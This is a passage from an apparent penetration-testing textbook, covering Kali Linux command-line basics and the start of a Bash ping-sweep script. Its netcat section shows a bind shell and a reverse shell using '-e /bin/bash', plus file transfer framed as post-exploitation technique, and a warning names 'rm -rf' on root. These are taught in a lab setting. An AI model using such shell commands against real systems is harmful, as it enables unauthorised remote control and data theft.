for attacks, configured our virtual network, and configured our target operating systems‚ÄîWindows XP, Windows 7, and Ubuntu. 
In the next chapter, we will get used to working with the Linux command 
line, and we‚Äôll be on our way to learning how to use the many pentesting 
tools and techniques in this book.
2
UsingK al L i
You will use Kali Linux as the attack platform throughout this book. Kali, the successor to the popular 
BackTrack Linux, is a Debian-based distribution that 
comes with a plethora of penetration testing tools 
preinstalled and preconfigured. Anyone who‚Äôs ever 
tried to set up a pentesting box from scratch the day
before a big engagement knows that getting everything working correctly 
can be a real pain. Having everything preconfigured in Kali can save a lot 
of time and headaches. Kali Linux works just like the standard Debian 
GNU/Linux distribution, with a lot of extra tools. 
Rather than point and click your way through Kali, you‚Äôll use the Linux 
command line because that‚Äôs where the real power lies. In this chapter we‚Äôll 
look at how to perform some common Linux tasks from the command line. 
If you‚Äôre already a Linux expert, you can skip this chapter and move on to 
Chapter 3; if not, take some time and dive in. 
56 Chapter 2
Linux Command Line
The Linux command line looks like this:
root@kali:~#
Like a DOS prompt or the Mac OS terminal, the Linux command 
line gives you access to a command processor called Bash that allows you 
to control the system by entering text-based instructions. When you open 
the command line you‚Äôll see the prompt root@kali#. Root is the superuser 
on Linux systems, and it has complete control of Kali. 
To perform operations in Linux, you enter commands along with any 
relevant options. For example, to view the contents of root‚Äôs home directory, 
enter the command ls as shown here.
root@kali:~# ls
Desktop 
As you can see, there‚Äôs not much in the root directory, only a folder 
called Desktop. 
The Linux Filesyste
In the Linux world, everything is a file: keyboards, printers, network 
devices‚Äîeverything. All files can be viewed, edited, deleted, created, 
and moved. The Linux filesystem is made up of a series of directories 
that branch off from the root of the filesystem (/). 
To see your current directory, enter pwd at the terminal:
root@kali:~# pwd
/root
Changing Directories
To move to another directory, enter cd directory using either the absolute or 
relative path to the new directory, based your current location. The absolute 
path is the path to a file in relation to the root directory (/). For example, to 
change to your desktop from anywhere, you could enter the absolute path 
to the desktop with cd /root/Desktop to reach the root user‚Äôs desktop. If you 
were in the directory /root (the root user‚Äôs home directory), you could use 
the relative path to the desktop (that is, relative to your current location) by 
entering cd Desktop, which would also take you to the desktop. 
The command cd .. takes you back one level in the filesystem, as 
shown here. 
root@kali:~/Desktop# cd ..
root@kali:~/# cd ../etc
root@kali:/etc# 
Using Kali Linux 57
Entering cd .. from root‚Äôs Desktop directory takes us back to root‚Äôs home 
directory. Entering cd ../etc from there moves us back up to the root of the 
filesystem and then to the /etc directory. 
Learning About Commands: The Man Pa
To learn more about a command and its options and arguments, you can 
view its documentation (called its manual page, or man page) by entering man 
command. For example, to learn more about the ls command enter man ls as 
shown in Listing 2-1.
root@kali:~# man ls
LS(1) User Commands LS(1)
NAME
 ls - list directory contents
SYNOPSIS
 ls [OPTION]... [FILE]... u
DESCRIPTION v
 List information about the FILEs (the current directory by default).
 Sort entries alphabetically if none of -cftuvSUX nor --sort is speci-
 fied.
 Mandatory arguments to long options are mandatory for short options
 too.
 -a, --all w
 do not ignore entries starting with .
 -A, --almost-all
 do not list implied . and ..
--snip--
 -l use a long listing format
--snip--
Listing 2-1: Linux man page
The man page gives useful (if a bit unfriendly looking) information 
about the ls command including its usage u, description v, and available 
options w. 
As you can see in the description section at v, the ls command lists all 
files in the current working directory by default, but you can also use ls to 
get information about a particular file. For example, according to the man 
page you can use the -a option with ls to show all files, including hidden 
directories‚Äîdirectories not shown in the default ls listing‚Äîas shown in 
Listing 2-2.
58 Chapter 2
root@kali:~# ls -a
. .mozilla
.. .msf4 
.android .mysql_history
.bash_history .nano_history
--snip--
Listing 2-2: Using an option with ls
As you can see, there are several hidden directories in the root directory, all of which are preceded by a period (.) character. (In Chapter 8, 
we‚Äôll see how these sometimes-hidden directories can lead to a system compromise.) You can also see the entries . and .., which denote the current 
directory and the parent directory, respectively.
User Privilege
Linux user accounts offer resources to a particular individual or service. 
A user may log in with a password and be offered certain resources on the 
Linux system, such as the ability to write files and browse the Internet. 
That user may not be able to see files that belong to other users and can 
have reasonable assurance that other users can‚Äôt see his or her files either. 
In addition to traditional user accounts used by a person who logs in with a 
password and accesses the system, Linux systems can allow software to have 
a user account. The software can have the ability to use system resources 
to do its job, but it cannot read other users‚Äô private files. The accepted best 
practice on Linux systems is to run day-to-day commands as an unprivileged 
user account instead of running everything as the privileged root user to 
avoid inadvertently harming your system or granting excessive privilege to 
the commands and applications you run. 
Adding a User
By default, Kali offers only the privileged root account. Though many 
security tools require root privileges to run, you may want to add another 
unprivileged account for everyday use to reduce the potential for damage 
to your system. Remember, the root account can do anything on Linux, 
including corrupting all of your files.
To add a new user georgia to your Kali system use the adduser command, 
as shown in Listing 2-3. 
root@kali:~# adduser georgia
Adding user `georgia' ...
Adding new group `georgia' (1000) ...
Adding new user `georgia' (1000) with group `georgia' ... u
Creating home directory `/home/georgia' ... v
Copying files from `/etc/skel' ...
Enter new UNIX password: w
Retype new UNIX password: 
Using Kali Linux 59
passwd: password updated successfully
Changing the user information for georgia
Enter the new value, or press ENTER for the default
 Full Name []: Georgia Weidman x
 Room Number []: 
 Work Phone []: 
 Home Phone []: 
 Other []: 
Is the information correct? [Y/n] Y
Listing 2-3: Adding a new user 
As you can see, in addition to adding a user to the system, a group georgia
is created, a new user is added to this group u, a home directory is created 
for the user v, and the system prompts for information about the user, such 
as a password w and the user‚Äôs full name x. 
Adding a User to the sudoers File
When you need to do something that requires root privileges as a regular 
user, use the sudo command along with the command that you want to run 
as root, and then enter your password. For the newly created user georgia
to be able to run privileged commands you need to add her to the sudoers
file, which specifies which users can use the sudo command. To do so, enter 
adduser username sudo as shown here.
root@kali:~# adduser georgia sudo
Adding user 'georgia' to group `sudo' ...
Adding user georgia to group sudo
Done.
Switching Users and Using sudo
To switch users in your terminal session, say from the root user to georgia, 
use the su command as shown in Listing 2-4. 
root@kali:~# su georgia
georgia@kali:/root$ adduser john
bash: adduser: command not found u
georgia@kali:/root$ sudo adduser john
[sudo] password for georgia: 
Adding user `john' ... v
Adding new group `john' (1002) ...
Adding new user `john' (1002) with group `john' ...
--snip--
georgia@kali:/root$ su
Password: 
root@kali:~# 
Listing 2-4: Switching to a different user
60 Chapter 2
You switch users with the su command. If you try to run commands 
(such as the adduser command) that require more privileges than the current user (georgia), the command is unsuccessful (command not found) u
because you can run the adduser command only as root.
Luckily, as discussed previously, you can use the sudo command to run 
a command as root. Because the georgia user is a member of the sudo group, 
you can run privileged commands, and you can see user john is added v to 
the system. 
To change back to the root user, enter the su command with no username. You will be prompted for the root‚Äôs password (toor).
Creating a New File or Directory
To create a new, empty file called myfile, use the touch command. 
root@kali:# touch myfile
To create a new directory in your current working directory, enter mkdir 
directory as shown here. 
root@kali:~# mkdir mydirectory
root@kali:~# ls
 Desktop mydirectory myfile 
root@kali:~# cd mydirectory/
Use ls to confirm that the new directory has been created, and then 
change to mydirectory using cd.
Copying, Moving, and Removing Files
To copy a file, use the cp command as shown here.
root@kali:/mydirectory# cp /root/myfile myfile2
The syntax is cp source destination. When using cp, the original file is 
left in place, and a copy is made at the desired destination. 
Similarly, you can move a file from one location to another using the 
mv command. The syntax is identical to cp, but this time the file is removed 
from the source location. 
You can remove a file from the filesystem by entering rm file. To 
remove files recursively use the -r command. 
WARNING Be careful when removing files, particularly recursively! Some hackers joke th
first command to teach Linux beginners is rm -rf from the root directory, which forcibly deletes the entire filesystem. This teaches new users the power of performing actions 
as root. Don‚Äôt try that at home!
Using Kali Linux 61
Adding Text to a File
The echo command echoes what you enter to the terminal, as shown here. 
root@kali:/mydirectory# echo hello georgia
hello georgia
To save text to a file, you can redirect your input to a file instead of to 
the terminal with the > symbol. 
root@kali:/mydirectory# echo hello georgia > myfile
To see the contents of your new file you can use the cat command. 
root@kali:/mydirectory# cat myfile
hello georgia
Now echo a different line of text into myfile as shown next. 
root@kali:# echo hello georgia again > myfile
root@kali:/mydirectory# cat myfile
hello georgia again
The > overwrites the previous contents of the file. If you echo another 
line into myfile, that new line overwrites the output of the previous command. As you can see, the contents of myfile now reads hello georgia again.
Appending Text to a File
To append text to a file, use >> as shown here. 
root@kali:/mydirectory# echo hello georgia a third time >> myfile
root@kali:/mydirectory# cat myfile
hello georgia again
hello georgia a third time
As you can see, appending preserves the previous contents of the file. 
File Permissions
If you look at the long output of ls -l on myfile, you can see the current permissions for myfile.
root@kali:~/mydirectory# ls -l myfile
-rw-r--r-- 1 root root 47 Apr 23 21:15 myfile 
From left to right you see the file type and permissions (-rw-r‚Äîr--), the 
number of links to the file (1), the user and group that own the file (root), 
the file size (47 bytes), the last time the file was edited (April 23, 21:15), and 
finally the filename (myfile).
62 Chapter 2
Linux files have permissions to read (r), write (w), and execute (x) and 
three sets of user permissions: permissions for the owner, the group, and 
all users. The first three letters denote the permissions for the owner, the 
following three denote the permissions for the group, and the final three 
denote the permissions for all users. Since you created myfile from the root 
user account, the file is owned by user root and group root, as you can see in 
the output with root root. User root has read and write permissions for the 
file (rw). Other users in the group, if there are any, can read the file (r) but 
not write to or execute it. The last r shows that all users on the filesystem 
can read the file.
To change permissions on a file, use the chmod command. You can use 
chmod to specify permissions for the owner, the group, and the world. When 
specifying permissions use the numbers from 0 through 7 as shown in 
Table 2-1.
Table 2-1: Linux File Permission
Integer Value Permissions Binary Representatio
7 full 111
6 read and write 110
5 read and execute 101
4 read only 100
3 write and execute 011
2 write only 010
1 execute only 001
0 none 000
When entering new file permissions, you use one digit for the owner, 
one for the group, and one for world. For example, to give the owner full 
permissions but the group and the world no permissions to read, write, or 
execute a file, use chmod 700 like this: 
root@kali:~/mydirectory# chmod 700 myfile
root@kali:~/mydirectory# ls -l myfile
-rwx------u 1 root root 47 Apr 23 21:15 myfile
Now when you run the ls -l command on myfile, you can see that root 
has read, write, and execute (rwx) permissions and the other sets are blank u. 
If you try to access the file as any user other than root, you‚Äôll get a permission denied error. 
Editing File
Perhaps no debate brings out such passion among Linux users as which is 
the best file editor. We‚Äôll look at the basics of using two popular editors, vi 
and nano, beginning with my favorite, nano. 
Using Kali Linux 63
root@kali:~/mydirectory# nano testfile.txt
Once in nano you can begin adding text to a new file called testfile.txt. 
When you open nano, you should see a blank file with help information for 
nano shown at the bottom of the screen, as shown here.
 [ New File ]
^G Get Help ^O WriteOut ^R Read File ^Y Prev Page ^K Cut Text ^C Cur Pos
^X Exit ^J Justify ^W Where Is ^V Next Page ^U UnCut Text^T To Spell
To add text to the file, just start typing. 
Searching for Text
To search for text in a file, use ctrl-W, and then enter the text to search for 
at the search prompt as shown next. 
--snip--
Search:georgia
^G Get Help ^Y First Line^T Go To Line^W Beg of ParM-J FullJstifM-B Backwards
^C Cancel ^V Last Line ^R Replace ^O End of ParM-C Case SensM-R Regexp
Nano should find the text georgia if the word is in the file. To exit, 
press ctrl-X. You will be prompted to save the file or lose the changes, 
as shown here:
--snip--
Save modified buffer (ANSWERING "No" WILL DESTROY CHANGES) ? Y 
 Y Yes
 N No ^C Cancel
Enter Y to save the file. Now we‚Äôll edit the file with the vi editor. 
Editing a File with vi
Add the text in Listing 2-5 to testfile.txt. In addition to the contents of the 
file, at the bottom of the vi screen you see some information including the 
filename, number of lines, and the current cursor position (see Listing 2-5). 
root@kali:~/mydirectory# vi testfile.txt
hi
georgia
we
are
teaching
pentesting
today
~ 
 
"testfile.txt" 7L, 46C 1,1 
All
Listing 2-5: Editing files with vi 
64 Chapter 2
Unlike nano, you can‚Äôt just start editing the file once it is opened in vi. 
To edit a file, enter I to put vi into insert mode. You should see the word 
INSERT displayed at the bottom of your terminal. Once you‚Äôve finished 
making changes, press esc to exit insert mode and return to command 
mode. Once in command mode, you can use commands to edit your text. 
For example, position the cursor at the line we and enter dd to delete the 
word we from the file.
To exit vi, enter :wq to tell vi to write the changes to the file and quit, 
as shown in Listing 2-6.
hi
georgia
are
teaching
pentesting
today
 
:wq
Listing 2-6: Saving changes in vi 
NOTE To learn more about available commands for vi and nano, read the correspond
man pages. 
Which editor you use daily is up to you. Throughout this book we‚Äôll use 
nano to edit files, but feel free to substitute your editor of choice. 
Data Manipulati
Now for a bit of data manipulation. Enter the text in Listing 2-7 in myfile
using your desired text editor. The file lists some of my favorite security 
conferences and the months when they typically happen. 
root@kali:~/mydirectory# cat myfile
1 Derbycon September
2 Shmoocon January
3 Brucon September
4 Blackhat July
5 Bsides *
6 HackerHalted October
7 Hackcon April
Listing 2-7: Example list for data manipulation 
Using Kali Linux 65
Using grep
The command grep looks for instances of a text string in a file. For example, 
to search for all instances of the string September in our file, enter grep 
September myfile as follows.
root@kali:~/mydirectory# grep September myfile
1 Derbycon September
3 Brucon September
As you can see, grep tells us that Derbycon and Brucon are in September. 
Now suppose you want only the names of the conferences in September but not the number or the month. You can send the output of grep to 
another command for additional processing using a pipe (|). The cut command allows you to take each line of input, choose a delimiter, and print 
specific fields. For example, to get just the names of conferences that run in 
September you can grep for the word September as you did previously. Next, 
you pipe (|) the output to cut, where you specify a space as the delimiter 
with the -d option and say you want the second field with the field (-f) 
option, as shown here.
root@kali:~/mydirectory# grep September myfile | cut -d " " -f 2
Derbycon
Brucon
The result, as you can see, is that by piping the two commands together 
you get just the conferences Derbycon and Brucon. 
Using sed
Another command for manipulating data is sed. Entire books have been 
written about using sed, but we‚Äôll cover just the basics here with a simple 
example of finding a specific word and replacing it. 
The sed command is ideal for editing files automatically based on certain patterns or expressions. Say, for instance, you have a very long file, 
and you need to replace every instance of a certain word. You can do this 
quickly and automatically with the sed command. 
In the language of sed, a slash (/) is the delimiter character. For 
example, to replace all instances of the word Blackhat with Defcon in myfile, 
enter sed 's/Blackhat/Defcon/' myfile, as shown in Listing 2-8.
root@kali:~/mydirectory# sed 's/Blackhat/Defcon/' myfile
1 Derbycon September
2 Shmoocon January
3 Brucon September
4 Defcon July
5 Bsides *
6 HackerHalted October
7 Hackcon April
Listing 2-8: Replacing words with sed
66 Chapter 2
Pattern Matching with awk
Another command line utility for pattern matching is the awk command. 
For example, if you want to find conferences numbered 6 or greater, you 
can use awk to search the first field for entries greater than 5, as shown here. 
root@kali:~/mydirectory# awk '$1 >5' myfile
6 HackerHalted October
7 Hackcon April
Or, if you want only the first and third words in every line, you can 
enter awk '{print $1,$3;}' myfile, as shown in Listing 2-9.
root@kali:~/mydirectory# awk '{print $1,$3;}' myfile
1 September
2 January
3 September
4 July
5 *
6 October
7 April
Listing 2-9: Selecting certain columns with awk
NOTE We‚Äôve looked at only simple examples of using these data manipulation utilities
this section. To get more information, consult the man pages. These utilities can be 
powerful time-savers. 
Managing Installed Packag
On Debian-based Linux distributions such as Kali Linux, you can use the 
Advanced Packaging Tool (apt) to manage packages. To install a package, 
enter apt-get install package. For example, to install Raphael Mudge‚Äôs frontend for Metasploit, Armitage, in Kali Linux, enter the following:
root@kali:~# apt-get install armitage
It‚Äôs that easy: apt installs and configures Armitage for you. 
Updates are regularly released for the tools installed on Kali Linux. To 
get the latest versions of the packages already installed, enter apt-get upgrade. 
The repositories Kali uses for packages are listed in the file /etc/apt/sources
.list. To add additional repositories, you can edit this file and then run 
the command apt-get update to refresh the database to include the new 
repositories. 
Using Kali Linux 67
N ote This book is built off the base install of Kali 1.0.6 unless otherwise noted in
Chapter 1, so in order to follow along with the book as is, don‚Äôt update Kali.
Processes and Services
In Kali Linux you can start, stop, or restart services using the service command. For example, to start the Apache web server, enter service apache2 
start as shown next. 
root@kali:~/mydirectory# service apache2 start
[....] Starting web server: apache2: Could not reliably determine the server's 
fully qualified domain name, using 127.0.1.1 for ServerName
. ok 
Likewise, to stop the MySQL database server, enter service mysql stop. 
Managing Networkin
When setting up the Kali Linux virtual machines in Chapter 1, you 
used the ifconfig command to view network information as shown in 
Listing 2-10.
root@kali:~# ifconfig
eth0u Link encap:Ethernet HWaddr 00:0c:29:df:7e:4d 
 inet addr:192.168.20.9v Bcast:192.168.20.255 Mask:255.255.255.0w
 inet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link
 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
 RX packets:1756332 errors:930193 dropped:17 overruns:0 frame:0
 TX packets:1115419 errors:0 dropped:0 overruns:0 carrier:0
 collisions:0 txqueuelen:1000 
 RX bytes:1048617759 (1000.0 MiB) TX bytes:115091335 (109.7 MiB)
 Interrupt:19 Base address:0x2024 
--snip--
Listing 2-10: Viewing networking information with ifconfig
From the output of ifconfig you can glean a lot of information about 
your system‚Äôs network state. For one, the network interface is called eth0 u. 
The IPv4 address (inet addr) that my Kali box uses to talk to the network 
is 192.168.20.9 v (yours will probably differ). An IP address is a 32-bit label 
assigned to devices in a network. The IP address is named up of 4 octets, 
or 8-bit parts. 
68 Chapter 2
The address‚Äôs network mask, or netmask (Mask), at w identifies which parts 
of the IP address are part of the network and which parts belong to the 
host. In this case the netmask 255.255.255.0 tells you that the network is the 
first three octets, 192.168.20. 
The default gateway is where your host routes traffic to other networks. 
Any traffic destined outside the local network will be sent to the default 
gateway for it to figure out where it needs to go. 
root@kali:~# route
Kernel IP routing table
Destination Gateway Genmask Flags Metric Ref Use Iface
default 192.168.20.1u 0.0.0.0 UG 0 0 0 eth0
192.168.20.0 * 255.255.255.0 U 0 0 0 eth0
The route command output tells us that the default gateway is 
192.168.20.1 u. This makes sense because the system with the IP 
address 192.168.20.1 is the wireless router in my home network. Take 
note of your own default gateway for use in the following section.
Setting a Static IP Address
By default, your network connection uses dynamic host configuration 
protocol (DHCP) to pull an IP address from the network. To set a static 
address, so that your IP address won‚Äôt change, you need to edit the file 
/etc/network/interfaces. Use your preferred editor to open this file. The 
default configuration file is shown in Listing 2-11.
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).
# The loopback network interface
auto lo
iface lo inet loopback
Listing 2-11: The default /etc/network/interfaces file 
To give your system a static IP address you need to add an entry for the 
eth0 interface. Add the text shown in Listing 2-12 to /etc/network/interfaces
with the IP addresses changed to match your environment. 
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).
# The loopback network interface
auto lo
iface lo inet loopback
auto eth0
iface eth0 inet static u
address 192.168.20.9
Using Kali Linux 69
netmask 255.255.255.0 v
gateway 192.168.20.1 w
Listing 2-12: Adding a static IP address
You set the IP address for eth0 as static at u. Use the IP address, netmask ÔÇç, and gateway ÔÇé you found in the previous section to fill in the 
information in your file.
Once you‚Äôve made these changes, restart networking with service 
networking restart so that the newly added static networking information 
will be used. 
Viewing Network Connections
To view network connections, listening ports, and so on, use the netstat
command. For example, you can see the programs listening on TCP ports 
by issuing the command netstat -antp, as shown in Listing 2-13. Ports are 
simply software-based network sockets that listen on the network to allow 
remote systems to interact with programs on a system.
root@kali:~/mydirectory# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address Foreign Address State 
PID/Program name
tcp6 0 0 :::80 :::* LISTEN 
15090/apache2 
Listing 2-13: Using netstat to view listening ports 
You see that the Apache web server you started earlier in the chapter is 
listening on TCP port 80. (See the man page for other netstat options.)
Netcat: The Swiss Army Knife of TCP/IP Conn
As the man page notes, the Netcat tool is known as the Swiss Army knife 
for TCP/IP connections. It‚Äôs a versatile tool that we‚Äôll utilize throughout 
this book. 
To see Netcat‚Äôs various options enter nc -h, as shown in Listing 2-14.
root@kali:~# nc -h
[v1.10-40]
connect to somewhere: nc [-options] hostname port[s] [ports] ... 
listen for inbound: nc -l -p port [-options] [hostname] [port]
options:
 -c shell commands as `-e'; use /bin/sh to exec [dangerous!!]
 -e filename program to exec after connect [dangerous!!]
 -b allow broadcasts
--snip--
Listing 2-14: Netcat help information 
70 Chapter 2
Check to See If a Port Is Listening
Let‚Äôs have Netcat connect to a port to see if that port is listening for connections. You saw previously that the Apache web server is listening on port 80 
on your Kali Linux system. Tell Netcat to attach to port 80 verbosely, or output rich, with the -v option as shown next. If you started Apache correctly, 
you should see the following when attempting to connect the service.
root@kali:~# nc -v 192.168.20.9 80
(UNKNOWN) [192.168.20.10] 80 (http) open
As you can see, Netcat reports that port 80 is indeed listening (open) on 
the network. (We‚Äôll look more at open ports and why they are interesting in 
Chapter 5‚Äôs discussion of port scanning.) 
You can also listen on a port for an incoming connection using Netcat, 
as shown next.
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
You use the options l for listen, v for verbose, and p to specify the port 
to listen on. 
Next, open a second terminal window and use Netcat to connect to the 
Netcat listener.
root@kali:~# nc 192.168.20.9 1234
hi georgia
Once you connect, enter the text hi georgia, and when you return to the 
listener‚Äôs terminal window, you see that a connection was received and your 
text was printed.
listening on [any] 1234 ...
connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51917
hi georgia
Close down both Netcat processes by pressing ctrl-C. 
Opening a Command Shell Listener
Now for something a bit more interesting. When you set up your Netcat 
listener, use the -e flag to tell Netcat to execute /bin/bash (or start a Bash 
command prompt) when a connection is received. This allows anyone who 
connects to the listener to execute commands on your system, as shown next. 
root@kali:~# nc -lvp 1234 -e /bin/bash
listening on [any] 1234 ...
Again, use a second terminal window to connect to the Netcat listener.
Using Kali Linux 71
root@kali:~# nc 192.168.20.9 1234
whoami
root
You can now issue Linux commands to be executed by the Netcat listener. The whoami Linux command will tell you the current logged-in user. 
In this case, because the Netcat process was started by the root user, your 
commands will be executed as root. 
NOTE This is a simple example because both your Netcat listener and the connection are
the same system. You could use another of your virtual machines, or even your host 
system, for this exercise as well. 
Close down both Netcat processes again. 
Pushing a Command Shell Back to a Listener
In addition to listening on a port with a command shell, you can also push 
a command shell back to a Netcat listener. This time set up the Netcat listener without the -e flag as shown next.
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
Now open a second terminal, and connect back to the Netcat listener 
you just created as shown here.
root@kali:~# nc 192.168.20.9 1234 -e /bin/bash
Connect with Netcat as usual, but this time use the -e flag to execute 
/bin/bash on the connection. Back in your first terminal you see a connection as shown next, and if you enter terminal commands, you will see them 
executed. (We‚Äôll learn more about listening with /bin/bash on a local port 
and actively pushing /bin/bash with a connection, known as bind shells and 
reverse shells, respectively, in Chapter 4.)
listening on [any] 1234 ...
connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51921
whoami
root
Now, one more thing with Netcat. This time, instead of outputting what 
comes into your listener to the screen, use > to send it to a file as shown next. 
root@kali:~# nc -lvp 1234 > netcatfile
listening on [any] 1234 ...
In the second terminal you set up Netcat to connect, but this time you 
use the < symbol to tell it to send the contents of a file (myfile) over the 
72 Chapter 2
Netcat connection. Give Netcat a second or two to finish, and then examine 
the contents of the file netcatfile created by your first Netcat instance. The 
contents should be identical to myfile.
root@kali:~# nc 192.168.20.9 1234 < mydirectory/myfile
You have used Netcat to transfer the file. In this case we‚Äôve simply transferred the file from one directory to another, but you can imagine how this 
technique can be used to transfer files from system to system‚Äîa technique 
that often comes in handy in the post-exploitation phase of a pentest, once 
you have access to a system. 
Automating Tasks with cron Job
The cron command allows us to schedule tasks to automatically run at a 
specified time. In the /etc directory in Kali, you can see several files and 
directories related to cron, as shown in Listing 2-15.
root@kali:/etc# ls | grep cron
cron.d
cron.daily
cron.hourly
cron.monthly
crontab
cron.weekly
Listing 2-15: crontab files 
The cron.daily, cron.hourly, cron.monthly, and cron.weekly directories specify scripts that will run automatically, every day, every hour, every month, or 
every week, depending on which directory you put your script in. 
If you need more flexibility you can edit cron‚Äôs configuration file, /etc/
crontab. The default text is shown in Listing 2-16.
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user command
17 * * * * root cd / && run-parts --report /etc/cron.hourly u
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) v
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
Listing 2-16: crontab configuration file 
Using Kali Linux 73
The fields in a crontab are, from left to right, the minute, hour, day of 
the month, month, day of the week, user who will run the command, and, 
finally, the command to be run. To run a command every day of the week, 
every hour, and so on, you use an asterisk (*) instead of specifying a value 
for the column. 
For example, look at the first crontab line at u, which runs the hourly 
cron jobs specified in /etc/cron.hourly. This crontab runs on the 17th minute 
of every hour every day of every month on every day of the week. The line 
at v says that the daily crontab (/etc/cron.daily) will be run at the 25th minute of the 6th hour of every day of every month on every day of the week. (For 
more flexibility, you can add a line here instead of adding to the hourly, daily, 
weekly, or monthly lists.)
Summary
In this chapter we‚Äôve looked at some common Linux tasks. Navigating the 
Linux filesystem, working with data, and running services are all skills that 
will serve you well as you move through the rest of this book. In addition, 
when attacking Linux systems, knowing which commands to run in a Linux 
environment will help you make the most of successful exploitation. You 
may want to automatically run a command periodically by setting up a cron
job or use Netcat to transfer a file from your attack machine. You will use 
Kali Linux to run your attacks throughout this book, and one of your target 
systems is Ubuntu Linux, so having the basics in place will make learning 
pentesting come more naturally. 

3
Programming
In this chapter we will look at some basic examples 
of computer programming. We will look at writing 
programs to automate various useful tasks in multiple 
programming languages. Even though we use prebuilt 
software for the majority of this book, it is useful to be 
able to create your own programs. 
Bash Scriptin
In this section we‚Äôll look at using Bash scripts to run several commands 
at once. Bash scripts, or shell scripts, are files that include multiple terminal 
commands to be run. Any command we can run in a terminal can be run 
in a script.
76 Chapter 3
Ping
We‚Äôll call our first script pingscript.sh. When it runs, this script will perform 
a ping sweep on our local network that sends Internet Control Message 
Protocol (ICMP) messages to remote systems to see if they respond.
We‚Äôll use the ping tool to determine which hosts are reachable on a network. (Although some hosts may not respond to ping requests and may be 
up despite not being ‚Äúpingable,‚Äù a ping sweep is still a good place to start.) 
By default, we supply the IP address or hostname to ping. For example, to 
ping our Windows XP target, enter the bold code in Listing 3-1. 
root@kali:~/# ping 192.168.20.10
PING 192.168.20.10 (192.168.20.10) 56(84) bytes of data.
64 bytes from 192.168.20.10: icmp_req=1 ttl=64 time=0.090 ms
64 bytes from 192.168.20.10: icmp_req=2 ttl=64 time=0.029 ms
64 bytes from 192.168.20.10: icmp_req=3 ttl=64 time=0.038 ms
64 bytes from 192.168.20.10: icmp_req=4 ttl=64 time=0.050 ms
^C
--- 192.168.20.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999 ms
rtt min/avg/max/mdev = 0.029/0.051/0.090/0.024 ms
Listing 3-1: Pinging a remote host 
We can tell from the ping output that the Windows XP target is up 
and responding to ping probes because we received replies to our ICMP 
requests. (The trouble with ping is that it will keep running forever unless 
you stop it with ctrl-C.)
A Simple Bash Script
Let‚Äôs begin writing a simple Bash script to ping hosts on the network. A good 
place to start is by adding some help information that tells your users how 
to run your script correctly. 
#!/bin/bash
echo "Usage: ./pingscript.sh [network]"
echo "example: ./pingscript.sh 192.168.20"
The first line of this script tells the terminal to use the Bash interpreter. 
The next two lines that begin with echo simply tell the user that our ping 
script will take a command line argument (network), telling the script which 
network to ping sweep (for example, 192.168.20). The echo command will 
simply print the text in quotes. 
note This script implies we are working with a class C network, where the first three octets 
of the IP address make up the network.
After creating the script, use chmod to make it executable so we can run it. 
root@kali:~/# chmod 744 pingscript.sh
Programming 77
Running Our Script
Previously, when entering Linux commands, we typed the command 
name at the prompt. The filesystem location of built-in Linux commands 
as well as pentest tools added to Kali Linux are part of our PATH environmental variable. The PATH variable tells Linux which directories to search 
for executable files. To see which directories are included in our PATH, 
enter echo $PATH. 
root@kali:~/# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
Notice in the output that the /root directory is not listed. That means that 
we won‚Äôt be able to simply enter pingscript.sh to run our Bash script. Instead 
we‚Äôll enter ./pingscript.sh to tell the terminal to run the script from our 
current directory. As shown next, the script prints the usage information. 
root@kali:~/# ./pingscript.sh
Usage: ./pingscript.sh [network]
example: ./pingscript.sh 192.168.20
Adding Functionality with if Statements
Now let‚Äôs add in a bit more functionality with an if statement, as shown in 
Listing 3-2. 
#!/bin/bash
if [ "$1" == "" ] u
then v
echo "Usage: ./pingscript.sh [network]"
echo "example: ./pingscript.sh 192.168.20"
fi w
Listing 3-2: Adding an if statement 
Typically a script needs to print usage information only if the user 
uses it incorrectly. In this case, the user needs to supply the network to 
scan as a command line argument. If the user fails to do so, we want to 
inform the user how to run our script correctly by printing the usage 
information. 
To accomplish this, we can use an if statement to see if a condition is 
met. By using an if statement, we can have our script echo the usage information only under certain conditions‚Äîfor example, if the user does not 
supply a command line argument. 
The if statement is available in many programming languages, though 
the syntax varies from language to language. In Bash scripting, an if statement is used like this: if [condition], where condition is the condition that 
must be met. 
78 Chapter 3
In the case of our script, we first see whether the first command line 
argument is null u. The symbol $1 represents the first command line argument in a Bash script, and double equal signs (==) check for equality. After 
the if statement, we have a then statement v. Any commands between the 
then statement and the fi (if backward) w are executed only if the conditional statement is true‚Äîin this case, when the first command line argument to the script is null. 
When we run our new script with no command line argument, the if
statement evaluates as true, because the first command line argument is 
indeed null, as shown here.
root@kali:~/# ./pingscript.sh
Usage: ./pingscript.sh [network]
example: ./pingscript.sh 192.168.20
As expected we see usage information echoed to the screen. 
A for Loop 
If we run the script again with a command line argument, nothing happens. Now let‚Äôs add some functionality that is triggered when the user runs 
the script with the proper arguments, as shown in Listing 3-3.
#!/bin/bash
if [ "$1" == "" ]
then
echo "Usage: ./pingscript.sh [network]"
echo "example: ./pingscript.sh 192.168.20"
else u
for x in `seq 1 254`; do v
ping -c 1 $1.$x 
done w
fi
Listing 3-3: Adding a for loop 
After our then statement, we use an else statement u to instruct the 
script to run code when the if statement evaluates as false‚Äîin this case, if 
the user supplies a command line argument. Because we want this script 
to ping all possible hosts on the local network, we need to loop through 
the numbers 1 through 254 (the possibilities for the final octet of an 
